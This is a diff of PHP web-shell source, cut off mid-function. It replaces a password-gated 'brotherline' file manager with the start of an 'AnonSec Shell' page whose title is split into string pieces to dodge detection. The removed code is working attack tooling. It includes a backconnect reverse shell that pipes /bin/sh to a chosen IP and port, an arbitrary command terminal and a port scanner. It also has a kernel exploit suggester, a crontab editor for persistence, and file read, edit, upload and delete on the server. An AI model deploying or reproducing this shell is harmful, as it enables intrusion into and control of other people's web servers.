@@ -1,2670 +1,1433 @@
-<?php
-session_start();
-
-// ===================== AUTH =====================
-define('FM_PASSWORD', 'rusherinhere');
-
-if (isset($_POST['fm_login'])) {
-    if ($_POST['fm_password'] === FM_PASSWORD) {
-        $_SESSION['fm_authed'] = true;
-        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
-        exit;
-    } else {
-        $login_error = true;
-    }
-}
-
-if (isset($_GET['fm_logout'])) {
-    session_destroy();
-    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
-    exit;
-}
-
-if (empty($_SESSION['fm_authed'])) {
-    $err = isset($login_error) ? true : false;
-?>
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en" id="html-root">
 <head>
-    <meta charset="UTF-8"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>brotherline — Login</title>
+    <?php echo "<title>An"."onS"."ec Sh"."el"."l</title>"; ?>
+    <meta name="robots" content="noindex">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://i.imgur.com/Be4uoSM.png" type="image/x-icon">
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@300;400;500;600&family=Geist:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        * { box-sizing: border-box; }
-        body {
-            background: #0a0c0f;
-            font-family: 'Geist', system-ui, sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-
-        /* Animated grid background */
-        body::before {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background-image:
-                linear-gradient(rgba(232,93,56,0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(232,93,56,0.03) 1px, transparent 1px);
-            background-size: 40px 40px;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        /* Glow orb */
-        body::after {
-            content: '';
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 600px;
-            height: 600px;
-            background: radial-gradient(circle, rgba(232,93,56,0.06) 0%, transparent 65%);
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        .login-card {
-            position: relative;
-            z-index: 1;
-            background: #111318;
-            border: 1px solid #1e2229;
-            border-radius: 14px;
-            padding: 44px 44px 36px;
-            width: 380px;
-            box-shadow: 0 24px 80px rgba(0,0,0,0.6), 0 0 0 1px rgba(232,93,56,0.04);
-        }
-
-        .login-logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 32px;
-        }
-        .login-logo-icon {
-            width: 36px;
-            height: 36px;
-            background: rgba(232,93,56,0.12);
-            border: 1px solid rgba(232,93,56,0.2);
-            border-radius: 9px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #e85d38;
-            font-size: 14px;
-        }
-        .login-logo-text {
-            font-family: 'Geist Mono', monospace;
-            font-size: 15px;
-            font-weight: 600;
-            color: #d4dae6;
-            letter-spacing: -0.01em;
-        }
-        .login-logo-sub {
-            font-size: 11px;
-            color: #404858;
-            font-family: 'Geist Mono', monospace;
-            margin-top: 1px;
-        }
-
-        .login-title {
-            font-size: 20px;
-            font-weight: 600;
-            color: #d4dae6;
-            margin-bottom: 6px;
-            letter-spacing: -0.02em;
-        }
-        .login-desc {
-            font-size: 12.5px;
-            color: #404858;
-            margin-bottom: 28px;
-            line-height: 1.5;
-        }
-
-        .input-group { margin-bottom: 16px; }
-        .input-label {
-            display: block;
-            font-size: 11.5px;
-            font-weight: 500;
-            color: #606878;
-            margin-bottom: 7px;
-            letter-spacing: 0.02em;
-        }
-        .input-wrap {
-            position: relative;
-            display: flex;
-            align-items: center;
-        }
-        .input-wrap i {
-            position: absolute;
-            left: 12px;
-            color: #404858;
-            font-size: 12px;
-            pointer-events: none;
-            transition: color 0.2s;
-        }
-        .pw-field {
-            width: 100%;
-            background: #0d1016;
-            border: 1px solid #1e2229;
-            border-radius: 8px;
-            padding: 10px 40px 10px 36px;
-            font-size: 13px;
-            color: #d4dae6;
-            font-family: 'Geist Mono', monospace;
-            outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            letter-spacing: 0.1em;
-        }
-        .pw-field::placeholder { letter-spacing: 0.02em; font-family: 'Geist', sans-serif; color: #2a3040; }
-        .pw-field:focus { border-color: #e85d38; box-shadow: 0 0 0 3px rgba(232,93,56,0.1); }
-        .pw-field:focus + .input-focus-icon, .input-wrap:focus-within i { color: #e85d38; }
-
-        .eye-btn {
-            position: absolute;
-            right: 10px;
-            background: none;
-            border: none;
-            color: #404858;
-            cursor: pointer;
-            padding: 4px;
-            font-size: 12px;
-            transition: color 0.15s;
-        }
-        .eye-btn:hover { color: #8a95a8; }
-
-        .error-msg {
-            display: flex;
-            align-items: center;
-            gap: 7px;
-            background: rgba(232,93,56,0.08);
-            border: 1px solid rgba(232,93,56,0.2);
-            border-radius: 7px;
-            padding: 9px 12px;
-            font-size: 12px;
-            color: #e85d38;
-            margin-bottom: 16px;
-            animation: shake 0.35s ease;
-        }
-        @keyframes shake {
-            0%,100%{transform:translateX(0)}
-            20%{transform:translateX(-5px)}
-            40%{transform:translateX(5px)}
-            60%{transform:translateX(-4px)}
-            80%{transform:translateX(4px)}
-        }
-
-        .login-btn {
-            width: 100%;
-            background: #e85d38;
-            border: none;
-            border-radius: 8px;
-            padding: 11px;
-            font-size: 13.5px;
-            font-weight: 600;
-            color: #fff;
-            cursor: pointer;
-            font-family: 'Geist', sans-serif;
-            letter-spacing: 0.01em;
-            transition: all 0.2s;
-            margin-top: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        .login-btn:hover { background: #f07a5c; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(232,93,56,0.3); }
-        .login-btn:active { transform: translateY(0); box-shadow: none; }
-
-        .login-footer {
-            text-align: center;
-            margin-top: 24px;
-            font-size: 11px;
-            color: #252d38;
-            font-family: 'Geist Mono', monospace;
-        }
-
-        /* Scanline effect on card */
-        .login-card::after {
-            content: '';
-            position: absolute;
-            inset: 0;
-            border-radius: 14px;
-            background: repeating-linear-gradient(
-                0deg,
-                transparent,
-                transparent 2px,
-                rgba(255,255,255,0.005) 2px,
-                rgba(255,255,255,0.005) 4px
-            );
-            pointer-events: none;
-        }
-    </style>
-</head>
-<body>
-    <div class="login-card">
-        <div class="login-logo">
-            <div class="login-logo-icon"><i class="fas fa-terminal"></i></div>
-            <div>
-                <div class="login-logo-text">brotherline</div>
-                <div class="login-logo-sub">/ file-manager</div>
-            </div>
-        </div>
-
-        <div class="login-title">Access Required</div>
-        <div class="login-desc">Enter your password to continue to the file manager.</div>
-
-        <?php if ($err): ?>
-        <div class="error-msg">
-            <i class="fas fa-exclamation-circle"></i>
-            Incorrect password. Try again.
-        </div>
-        <?php endif; ?>
-
-        <form method="POST" action="" autocomplete="off">
-            <input type="hidden" name="fm_login" value="1" />
-            <div class="input-group">
-                <label class="input-label">PASSWORD</label>
-                <div class="input-wrap">
-                    <i class="fas fa-lock"></i>
-                    <input class="pw-field" type="password" name="fm_password" id="pwInput"
-                           placeholder="Enter password" autofocus />
-                    <button type="button" class="eye-btn" id="eyeBtn" tabindex="-1">
-                        <i class="fas fa-eye" id="eyeIcon"></i>
-                    </button>
-                </div>
-            </div>
-            <button type="submit" class="login-btn">
-                <i class="fas fa-sign-in-alt"></i> Sign In
-            </button>
-        </form>
-
-        <div class="login-footer">© brotherline · unauthorized access prohibited</div>
-    </div>
-
-    <script>
-        const pw = document.getElementById('pwInput');
-        const eyeBtn = document.getElementById('eyeBtn');
-        const eyeIcon = document.getElementById('eyeIcon');
-        eyeBtn.addEventListener('click', function() {
-            const show = pw.type === 'password';
-            pw.type = show ? 'text' : 'password';
-            eyeIcon.className = show ? 'fas fa-eye-slash' : 'fas fa-eye';
-        });
-        // Press Enter to submit
-        pw.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') this.form.submit();
-        });
-    </script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"/>
-</body>
-</html>
-<?php
-    exit;
-}
-// ===================== END AUTH =====================
-
-if (isset($_REQUEST['action'])) {
-    $action = $_REQUEST['action'];
-    switch ($action) {
-        // --- System & Tools ---
-        case 'get_stats':
-            handleGetStats();
-            break;
-        case 'adminer':
-            handleAdminer();
-            break;
-        case 'port_scan':
-            handlePortScan();
-            break;
-        case 'linux_exploit_suggester':
-            handleLinuxExploitSuggester();
-            break;
-        case 'backconnect':
-            handleBackconnect();
-            break;
-        case 'cron_manager':
-            handleCronManager();
-            break;
-        case 'terminal':
-            handleTerminal();
-            break;
-
-        // --- File Manager Actions ---
-        case 'list':
-            handleListFiles();
-            break;
-        case 'chdir':
-            handleChdir();
-            break;
-        case 'create-dir':
-        case 'create-file':
-            handleCreateItem($action);
-            break;
-        case 'delete':
-            handleDeleteItem();
-            break;
-        case 'rename':
-            handleRenameItem();
-            break;
-        case 'chmod':
-            handleChangePermissions();
-            break;
-        case 'get-content':
-            handleGetFileContent();
-            break;
-        case 'save-content':
-            handleSaveFileContent();
-            break;
-        case 'download':
-            handleDownloadFile();
-            break;
-        case 'upload-file':
-            handleUploadFiles();
-            break;
-        case 'bulk-delete':
-            handleBulkDelete();
-            break;
-        case 'bulk-chmod':
-            handleBulkChmod();
-            break;
-        case 'bulk-download':
-            handleBulkDownload();
-            break;
-
-        default:
-            send_error('Invalid action specified.');
-            break;
-    }
-    exit;
-}
-
-// =================================================================
-// ACTION HANDLER FUNCTIONS
-// =================================================================
-
-function handleGetStats()
-{
-    header('Content-Type: application/json');
-
-    function get_server_cpu_load()
-    {
-        if (function_exists('sys_getloadavg')) {
-            $load = sys_getloadavg();
-            return $load[0];
-        }
-        return 'N/A';
-    }
-
-    $disk_total = @disk_total_space('/');
-    $disk_free = @disk_free_space('/');
-    $disk_used = $disk_total - $disk_free;
-    $disk_percent = ($disk_total > 0) ? ($disk_used / $disk_total) * 100 : 0;
-
-    $stats = [
-        'user' => function_exists('get_current_user') ? get_current_user() : 'N/A',
-        'php_version' => phpversion(),
-        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
-        'cpu_load' => get_server_cpu_load(),
-        'disk' => [
-            'total' => round($disk_total / (1024 * 1024 * 1024), 2),
-            'used' => round($disk_used / (1024 * 1024 * 1024), 2),
-            'percent' => round($disk_percent, 2),
-        ]
-    ];
-
-    echo json_encode($stats);
-}
-
-function handleAdminer()
-{
-    $adminer_file = 'adminer.php';
-    $adminer_url = 'https://www.adminer.org/latest.php';
-    if (!file_exists($adminer_file)) {
-        $adminer_content = @file_get_contents($adminer_url);
-        if ($adminer_content === false) {
-            header('Content-Type: text/html; charset=utf-8');
-            echo "<h3>Gagal Mengunduh Adminer</h3>";
-            echo "<p>Silakan unduh <code>adminer.php</code> secara manual dari situs resminya dan unggah ke direktori ini.</p>";
-            exit;
-        }
-        file_put_contents($adminer_file, $adminer_content);
-    }
-    include $adminer_file;
-}
-
-function handlePortScan()
-{
-    header('Content-Type: application/json');
-    $data = json_decode(file_get_contents('php://input'), true);
-    $host = $data['host'] ?? '';
-    $ports_str = $data['ports'] ?? '21,22,80,443,3306';
-    $timeout = $data['timeout'] ?? 1;
-
-    if (empty($host) || filter_var($host, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME) === false && filter_var($host, FILTER_VALIDATE_IP) === false) {
-        send_error('Host is required or invalid.');
-    }
-
-    $ports_to_scan = [];
-    foreach (explode(',', $ports_str) as $part) {
-        $part = trim($part);
-        if (strpos($part, '-') !== false) {
-            list($start, $end) = explode('-', $part);
-            if (is_numeric($start) && is_numeric($end)) {
-                for ($i = intval($start); $i <= intval($end); $i++) {
-                    $ports_to_scan[] = $i;
-                }
-            }
-        } elseif (is_numeric($part)) {
-            $ports_to_scan[] = intval($part);
-        }
-    }
-
-    $open_ports = [];
-    foreach (array_unique($ports_to_scan) as $port) {
-        $connection = @fsockopen($host, $port, $errno, $errstr, $timeout);
-        if (is_resource($connection)) {
-            $open_ports[] = $port;
-            fclose($connection);
-        }
-    }
-    send_success(['host' => $host, 'open_ports' => $open_ports, 'scanned_ports' => $ports_to_scan]);
-}
-
-function handleLinuxExploitSuggester()
-{
-    header('Content-Type: application/json');
-    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-        send_error("This tool is for Linux servers only.");
-    }
-    $commands = [
-        'Kernel Version' => 'uname -a',
-        'Distribution'   => 'lsb_release -a 2>/dev/null || cat /etc/*-release 2>/dev/null || cat /etc/issue 2>/dev/null',
-        'Proc Version'   => 'cat /proc/version'
-    ];
-    $results = [];
-    foreach ($commands as $label => $command) {
-        $results[$label] = htmlspecialchars(safe_exec($command));
-    }
-    send_success(['results' => $results]);
-}
-
-function handleBackconnect()
-{
-    header('Content-Type: application/json');
-    $data = json_decode(file_get_contents('php://input'), true);
-    $ip = $data['ip'] ?? '';
-    $port = intval($data['port'] ?? 0);
-
-    if (empty($ip) || filter_var($ip, FILTER_VALIDATE_IP) === false) {
-        send_error("Invalid IP address.");
-    }
-    if ($port <= 0 || $port > 65535) {
-        send_error("Invalid port.");
-    }
-
-    set_time_limit(0);
-    ignore_user_abort(true);
-    session_write_close();
-
-    $shell = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'cmd.exe' : '/bin/sh -i';
-    $sock = @fsockopen($ip, $port, $errno, $errstr, 30);
-    if (!$sock) {
-        send_error("Failed to connect to $ip:$port. Error: $errstr ($errno)");
-    }
-
-    send_success(['message' => "Backconnect initiated to $ip:$port. Check your listener."]);
-    if (function_exists('fastcgi_finish_request')) {
-        fastcgi_finish_request();
-    } else {
-        ob_flush();
-        flush();
-    }
-
-    $descriptorspec = [0 => $sock, 1 => $sock, 2 => $sock];
-    $process = proc_open($shell, $descriptorspec, $pipes);
-    if (is_resource($process)) {
-        proc_close($process);
-    }
-    fclose($sock);
-}
-
-function handleCronManager()
-{
-    header('Content-Type: application/json');
-    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-        send_error("Cron Manager is for Linux servers only.");
-    }
-
-    $data = json_decode(file_get_contents('php://input'), true);
-    $sub_action = $data['sub_action'] ?? 'list';
-
-    switch ($sub_action) {
-        case 'list':
-            $output = safe_exec('crontab -l 2>&1');
-            send_success(['cron_jobs' => (strpos($output, 'no crontab for') !== false || empty($output)) ? '' : $output]);
-            break;
-        case 'save':
-            $jobs = $data['jobs'] ?? '';
-            $tmp_file = tempnam(sys_get_temp_dir(), 'cron');
-            file_put_contents($tmp_file, $jobs . PHP_EOL);
-            $output = safe_exec('crontab ' . escapeshellarg($tmp_file) . ' 2>&1');
-            unlink($tmp_file);
-            empty($output) ? send_success(['message' => 'Crontab updated successfully.']) : send_error('Failed to update crontab: ' . $output);
-            break;
-        default:
-            send_error('Invalid Cron Manager action specified.');
-            break;
-    }
-}
-
-function handleTerminal()
-{
-    if (!isset($_SESSION['terminal_cwd'])) {
-        $_SESSION['terminal_cwd'] = __DIR__;
-    }
-    $data = json_decode(file_get_contents('php://input'), true);
-    $command = $data['cmd'] ?? '';
-    $cwd = $_SESSION['terminal_cwd'];
-
-    if (preg_match('/^cd\s*(.*)$/', $command, $matches)) {
-        $new_dir_str = trim($matches[1]);
-        $new_dir_str = trim($new_dir_str, "\"'");
-        $output = '';
-
-        if (empty($new_dir_str) || $new_dir_str === '~') {
-            $target_path = __DIR__;
-        } else {
-            $is_absolute = (DIRECTORY_SEPARATOR === '/' && substr($new_dir_str, 0, 1) === '/') ||
-                (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[a-zA-Z]:/', $new_dir_str));
-            $target_path = $is_absolute ? $new_dir_str : $cwd . DIRECTORY_SEPARATOR . $new_dir_str;
-        }
-
-        $real_target_path = realpath($target_path);
-
-        if ($real_target_path && is_dir($real_target_path)) {
-            $_SESSION['terminal_cwd'] = $real_target_path;
-        } else {
-            $output = "cd: no such file or directory: " . htmlspecialchars($new_dir_str);
-        }
-
-        header('Content-Type: application/json');
-        echo json_encode(['output' => $output]);
-        exit;
-    } elseif (!empty($command)) {
-        while (ob_get_level()) {
-            ob_end_flush();
-        }
-
-        header('Content-Type: text/plain; charset=UTF-8');
-        header('X-Content-Type-Options: nosniff');
-
-        session_write_close();
-        set_time_limit(0);
-
-        $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
-        $cd_command = $is_windows ? 'cd /d' : 'cd';
-
-        $full_command = $cd_command . ' ' . escapeshellarg($cwd) . ' && ' . $command;
-
-        $descriptorspec = [
-            0 => ["pipe", "r"],
-            1 => ["pipe", "w"],
-            2 => ["pipe", "w"]
-        ];
-
-        $process = proc_open($full_command, $descriptorspec, $pipes);
-
-        if (is_resource($process)) {
-            fclose($pipes[0]);
-
-            stream_set_blocking($pipes[1], false);
-            stream_set_blocking($pipes[2], false);
-
-            while (true) {
-                $status = proc_get_status($process);
-                if (!$status['running']) {
-                    break;
-                }
-
-                $read_streams = [$pipes[1], $pipes[2]];
-                $write_streams = null;
-                $except_streams = null;
-
-                if (stream_select($read_streams, $write_streams, $except_streams, 0, 200000) > 0) {
-                    foreach ($read_streams as $stream) {
-                        $output = fread($stream, 8192);
-                        if ($output !== false && strlen($output) > 0) {
-                            echo $output;
-                            flush();
-                        }
-                    }
-                }
-            }
-
-            $stdout_remains = stream_get_contents($pipes[1]);
-            if ($stdout_remains) {
-                echo $stdout_remains;
-                flush();
-            }
-            $stderr_remains = stream_get_contents($pipes[2]);
-            if ($stderr_remains) {
-                echo $stderr_remains;
-                flush();
-            }
-
-            fclose($pipes[1]);
-            fclose($pipes[2]);
-            proc_close($process);
-        }
-        exit;
-    } else {
-        header('Content-Type: application/json');
-        echo json_encode(['output' => '']);
-        exit;
-    }
-}
-
-
-// =================================================================
-// FILE MANAGER HANDLERS
-// =================================================================
-function get_fm_config()
-{
-    $root_dir = dirname($_SERVER['DOCUMENT_ROOT']);
-    define('DOC_ROOT', realpath($root_dir) ?: realpath(__DIR__));
-
-    if (!isset($_SESSION['fm_cwd'])) {
-        $_SESSION['fm_cwd'] = DOC_ROOT;
-    }
-}
-
-function handleListFiles()
-{
-    get_fm_config();
-    list_files($_SESSION['fm_cwd']);
-}
-
-function handleChdir()
-{
-    get_fm_config();
-    $target_path = $_REQUEST['target_path'] ?? '';
-    $current_cwd = $_SESSION['fm_cwd'];
-    $new_full_path = '';
-
-    $is_absolute = (DIRECTORY_SEPARATOR === '/' && substr($target_path, 0, 1) === '/') ||
-        (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[a-zA-Z]:/', $target_path));
-
-    if ($target_path === '..') {
-        $new_full_path = realpath($current_cwd . DIRECTORY_SEPARATOR . '..');
-    } elseif (empty($target_path)) {
-        $new_full_path = DOC_ROOT;
-    } elseif ($is_absolute) {
-        if (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[a-zA-Z]:$/', $target_path)) {
-            $target_path .= '\\';
-        }
-        $new_full_path = realpath($target_path);
-    } else {
-        $new_full_path = realpath($current_cwd . DIRECTORY_SEPARATOR . $target_path);
-    }
-
-    if ($new_full_path === false) {
-        send_error('Invalid path specified or path does not exist: ' . htmlspecialchars($target_path));
-    }
-
-    if (is_dir($new_full_path)) {
-        $_SESSION['fm_cwd'] = $new_full_path;
-        list_files($new_full_path);
-    } else {
-        send_error('Failed to change directory or target is not a directory.');
-    }
-}
-
-function get_validated_filepath($name_from_request)
-{
-    get_fm_config();
-    $name = basename($name_from_request);
-    $file_path = $_SESSION['fm_cwd'] . DIRECTORY_SEPARATOR . $name;
-
-    if (!file_exists($file_path)) {
-        send_error('Invalid path specified or file not found.');
-    }
-    return $file_path;
-}
-
-function handleCreateItem($action)
-{
-    get_fm_config();
-    $name = $_POST['name'] ?? '';
-    if ($action === 'create-dir') {
-        create_directory($_SESSION['fm_cwd'], $name);
-    } else {
-        create_file($_SESSION['fm_cwd'], $name);
-    }
-}
-
-function handleDeleteItem()
-{
-    $item_path = get_validated_filepath($_POST['name'] ?? '');
-    delete_item_recursive($item_path);
-    send_success(['message' => 'Item berhasil dihapus.']);
-}
-
-function handleRenameItem()
-{
-    get_fm_config();
-    $old_name = basename($_POST['old_name'] ?? '');
-    $new_name = basename($_POST['new_name'] ?? '');
-    rename_item($_SESSION['fm_cwd'], $old_name, $new_name);
-}
-
-function handleChangePermissions()
-{
-    $item_path = get_validated_filepath($_POST['name'] ?? '');
-    $perms = $_POST['perms'] ?? '';
-    change_permissions($item_path, $perms);
-}
-
-function handleGetFileContent()
-{
-    $file_path = get_validated_filepath($_GET['name'] ?? '');
-    get_file_content($file_path);
-}
-
-function handleSaveFileContent()
-{
-    $file_path = get_validated_filepath($_POST['name'] ?? '');
-    $content = $_POST['content'] ?? '';
-    save_file_content($file_path, $content);
-}
-
-function handleDownloadFile()
-{
-    $file_path = get_validated_filepath($_GET['name'] ?? '');
-    download_file($file_path);
-}
-
-function handleUploadFiles()
-{
-    get_fm_config();
-    upload_files($_SESSION['fm_cwd']);
-}
-
-function handleBulkDelete()
-{
-    get_fm_config();
-    $items = json_decode($_POST['items'] ?? '[]', true);
-    bulk_delete($_SESSION['fm_cwd'], $items);
-}
-
-function handleBulkChmod()
-{
-    get_fm_config();
-    $items = json_decode($_POST['items'] ?? '[]', true);
-    $perms = $_POST['perms'] ?? '';
-    bulk_chmod($_SESSION['fm_cwd'], $items, $perms);
-}
-
-function handleBulkDownload()
-{
-    get_fm_config();
-    $items = json_decode($_GET['items'] ?? '[]', true);
-    bulk_download($_SESSION['fm_cwd'], $items);
-}
-
-// =================================================================
-// HELPER & CORE FUNCTIONS
-// =================================================================
-
-function safe_exec($command)
-{
-    $isWindows = (stripos(PHP_OS, "WIN") === 0);
-
-    if ($isWindows) {
-        if (PHP_VERSION_ID >= 70400 && extension_loaded("FFI")) {
-            $ffi = FFI::cdef("
-                typedef int BOOL;
-                typedef void* HANDLE;
-                typedef unsigned long DWORD;
-                typedef const wchar_t* LPCWSTR;
-
-                typedef struct _STARTUPINFOW {
-                    DWORD cb;
-                    LPCWSTR lpReserved;
-                    LPCWSTR lpDesktop;
-                    LPCWSTR lpTitle;
-                    DWORD dwX;
-                    DWORD dwY;
-                    DWORD dwXSize;
-                    DWORD dwYSize;
-                    DWORD dwXCountChars;
-                    DWORD dwYCountChars;
-                    DWORD dwFillAttribute;
-                    DWORD dwFlags;
-                    WORD wShowWindow;
-                    WORD cbReserved2;
-                    BYTE* lpReserved2;
-                    HANDLE hStdInput;
-                    HANDLE hStdOutput;
-                    HANDLE hStdError;
-                } STARTUPINFOW;
-
-                typedef struct _PROCESS_INFORMATION {
-                    HANDLE hProcess;
-                    HANDLE hThread;
-                    DWORD dwProcessId;
-                    DWORD dwThreadId;
-                } PROCESS_INFORMATION;
-
-                BOOL CreateProcessW(
-                    LPCWSTR lpApplicationName,
-                    LPCWSTR lpCommandLine,
-                    void* lpProcessAttributes,
-                    void* lpThreadAttributes,
-                    BOOL bInheritHandles,
-                    DWORD dwCreationFlags,
-                    void* lpEnvironment,
-                    LPCWSTR lpCurrentDirectory,
-                    STARTUPINFOW* lpStartupInfo,
-                    PROCESS_INFORMATION* lpProcessInformation
-                );
-            ", "kernel32.dll");
-
-            $si = $ffi->new("STARTUPINFOW");
-            $pi = $ffi->new("PROCESS_INFORMATION");
-            $si->cb = FFI::sizeof($si);
-
-            $wcmd = FFI::new("wchar_t[512]");
-            FFI::memcpy(
-                $wcmd,
-                FFI::string("cmd.exe /c " . $command),
-                2 * strlen("cmd.exe /c " . $command)
-            );
-
-            $res = $ffi->CreateProcessW(
-                null,
-                $wcmd,
-                null,
-                null,
-                0,
-                0,
-                null,
-                null,
-                FFI::addr($si),
-                FFI::addr($pi)
-            );
-
-            return $res
-                ? "Process started (PID: " . $pi->dwProcessId . ")"
-                : "Failed to execute via CreateProcessW";
-        } else {
-            $descriptorspec = [
-                0 => ["pipe", "r"],
-                1 => ["pipe", "w"],
-                2 => ["pipe", "w"]
-            ];
-            $process = proc_open($command, $descriptorspec, $pipes);
-            $output = '';
-
-            if (is_resource($process)) {
-                fclose($pipes[0]);
-                $output = stream_get_contents($pipes[1]);
-                fclose($pipes[1]);
-                fclose($pipes[2]);
-                proc_close($process);
-            }
-            return $output;
-        }
-    } else {
-        $descriptorspec = [
-            0 => ["pipe", "r"],
-            1 => ["pipe", "w"],
-            2 => ["pipe", "w"]
-        ];
-
-        $process = proc_open($command, $descriptorspec, $pipes);
-        $output = '';
-
-        if (is_resource($process)) {
-            fclose($pipes[0]);
-            $output = stream_get_contents($pipes[1]);
-            fclose($pipes[1]);
-            fclose($pipes[2]);
-            proc_close($process);
-        }
-
-        return $output;
-    }
-}
-
-function send_error($message, $status_code = 400)
-{
-    header('Content-Type: application/json');
-    http_response_code($status_code);
-    echo json_encode(['success' => false, 'message' => $message]);
-    exit;
-}
-
-function send_success($data = [])
-{
-    header('Content-Type: application/json');
-    echo json_encode(array_merge(['success' => true], $data));
-    exit;
-}
-
-function list_files($dir)
-{
-    if (!is_dir($dir)) send_error('Directory not found.');
-
-    $files = [];
-    $items = @scandir($dir);
-    if ($items === false) send_error('Could not read directory. Check permissions.');
-
-    foreach ($items as $item) {
-        if ($item === '.' || $item === '..') continue;
-
-        $item_path = $dir . DIRECTORY_SEPARATOR . $item;
-        $is_dir = is_dir($item_path);
-        $files[] = [
-            'name' => $item,
-            'type' => $is_dir ? 'folder' : 'file',
-            'size' => $is_dir ? '-' : format_size(@filesize($item_path)),
-            'last_modified' => date('Y-m-d H:i:s', @filemtime($item_path)),
-            'permissions' => substr(sprintf('%o', @fileperms($item_path)), -4),
-        ];
-    }
-
-    usort($files, function ($a, $b) {
-        if ($a['type'] === 'folder' && $b['type'] !== 'folder') return -1;
-        if ($a['type'] !== 'folder' && $b['type'] === 'folder') return 1;
-        return strcasecmp($a['name'], $b['name']);
-    });
-
-    $display_path = str_replace(DOC_ROOT, '', $dir) ?: '/';
-
-    $response_data = [
-        'files' => $files,
-        'path' => $display_path,
-        'breadcrumbs' => generate_breadcrumbs($dir)
-    ];
-
-    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-        $drives = [];
-        foreach (range('A', 'Z') as $drive) {
-            if (is_dir($drive . ':\\')) {
-                $drives[] = ['name' => $drive . ':', 'path' => $drive . ':\\'];
-            }
-        }
-        $response_data['drives'] = $drives;
-    }
-
-    send_success($response_data);
-}
-
-function create_directory($path, $name)
-{
-    if (empty($name) || preg_match('/[\\/\:\*\?"<>\|]/', $name)) send_error('Invalid directory name.');
-    $new_dir = $path . DIRECTORY_SEPARATOR . $name;
-    if (file_exists($new_dir)) send_error('Directory already exists.');
-    if (@mkdir($new_dir)) send_success(['message' => 'Directory created successfully.']);
-    else send_error('Failed to create directory. Check permissions.');
-}
-
-function create_file($path, $name)
-{
-    if (empty($name) || preg_match('/[\\/\:\*\?"<>\|]/', $name)) send_error('Invalid file name.');
-    $new_file = $path . DIRECTORY_SEPARATOR . $name;
-    if (file_exists($new_file)) send_error('File already exists.');
-    if (@touch($new_file)) send_success(['message' => 'File created successfully.']);
-    else send_error('Failed to create file. Check permissions.');
-}
-
-function delete_item_recursive($item_path)
-{
-    if (is_dir($item_path)) {
-        $it = new RecursiveDirectoryIterator($item_path, RecursiveDirectoryIterator::SKIP_DOTS);
-        $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
-        foreach ($files as $file) {
-            $realPath = $file->getRealPath();
-            $file->isDir() ? @rmdir($realPath) : @unlink($realPath);
-        }
-        @rmdir($item_path);
-    } else {
-        @unlink($item_path);
-    }
-}
-
-function rename_item($path, $old_name, $new_name)
-{
-    if (empty($new_name) || preg_match('/[\\/\:\*\?"<>\|]/', $new_name)) send_error('Invalid new name.');
-    $old_path = $path . DIRECTORY_SEPARATOR . $old_name;
-    $new_path = $path . DIRECTORY_SEPARATOR . $new_name;
-    if (!file_exists($old_path)) send_error('Original item not found.');
-    if (file_exists($new_path)) send_error('An item with the new name already exists.');
-    if (rename($old_path, $new_path)) send_success(['message' => 'Berhasil diubah nama.']);
-    else send_error('Failed to rename. Check permissions.');
-}
-
-function change_permissions($item_path, $perms)
-{
-    if (!preg_match('/^[0-7]{4}$/', $perms)) send_error('Invalid permission format. Use a 4-digit octal value (e.g., 0755).');
-    if (@chmod($item_path, octdec($perms))) send_success(['message' => 'Permissions changed successfully.']);
-    else send_error('Failed to change permissions.');
-}
-
-function get_file_content($file_path)
-{
-    if (!is_file($file_path)) send_error('File not found.');
-    $content = @file_get_contents($file_path);
-    if ($content === false) send_error('Could not read file content.');
-    else send_success(['content' => $content]);
-}
-
-function save_file_content($file_path, $content)
-{
-    if (!is_file($file_path)) send_error('File not found.');
-    if (@file_put_contents($file_path, $content) !== false) send_success(['message' => 'File saved successfully.']);
-    else send_error('Failed to save file. Check permissions.');
-}
-
-function download_file($file_path)
-{
-    if (is_file($file_path)) {
-        header('Content-Description: File Transfer');
-        header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
-        header('Expires: 0');
-        header('Cache-Control: must-revalidate');
-        header('Pragma: public');
-        header('Content-Length: ' . filesize($file_path));
-        flush();
-        readfile($file_path);
-        exit;
-    } else {
-        http_response_code(404);
-        die('File not found.');
-    }
-}
-
-function upload_files($path)
-{
-    if (empty($_FILES['files_to_upload'])) {
-        send_error('Tidak ada file yang dipilih untuk diunggah.');
-    }
-    $files = $_FILES['files_to_upload'];
-    $errors = [];
-    $success_count = 0;
-    $file_count = is_array($files['name']) ? count($files['name']) : 1;
-
